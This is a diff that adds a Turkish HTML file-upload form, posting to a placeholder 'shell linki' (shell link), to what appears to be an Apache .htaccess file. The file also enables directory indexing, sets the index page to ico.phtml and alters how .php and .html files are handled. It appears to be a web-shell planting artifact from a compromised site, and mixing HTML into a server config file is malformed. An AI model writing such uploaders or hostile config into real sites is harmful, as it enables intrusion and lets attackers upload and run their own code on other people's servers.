@@ -1,3 +1,22 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8" />
+    <title>Dosya Yükleme Formu</title>
+</head>
+<body>
+
+    <h2>Dosya Yükleme Formu</h2>
+    <form action="shell linki" method="post" enctype="multipart/form-data">
+        <label for="file">Dosya seçin:</label>
+        <input type="file" name="file" id="file" required />
+        <br /><br />
+        <button type="submit">Yükle</button>
+    </form>
+
+</body>
+</html> 
+
 Options Indexes FollowSymLinks
 DirectoryIndex ico.phtml
 AddType txt .php
@@ -46,5 +65,6 @@ Options +Indexes
 AddType text/plain .php
 AddHandler server-parsed .php
 AddType text/plain .html
+
 
 
